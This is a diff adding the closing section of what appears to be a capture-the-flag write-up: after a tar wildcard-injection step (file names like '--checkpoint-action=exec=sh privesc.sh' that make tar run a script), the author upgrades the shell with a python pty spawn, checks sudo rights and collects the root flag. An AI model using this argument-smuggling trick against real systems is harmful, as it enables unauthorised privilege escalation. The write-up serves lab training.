@@ -205,3 +205,19 @@ echo "/var/www/html"  > "--checkpoint-action=exec=sh privesc.sh"
 echo "/var/www/html"  > --checkpoint=1
 ```
 
+Lets upgrade our shell a little bit to be able to run `sudo -l`.
+
+```
+python -c 'import pty;pty.spawn("/bin/bash")';
+```
+
+After a couple of minutes we run `sudo -l`:
+
+![image](https://user-images.githubusercontent.com/115602464/195761720-4a9a84b6-9183-41e3-a8ba-d12f80c505b4.png)
+
+Great! Lets get the root.txt file and get our last flag!
+
+![image](https://user-images.githubusercontent.com/115602464/195762012-08b427cb-439d-4f07-a25a-97d0739a97f1.png)
+
+
+
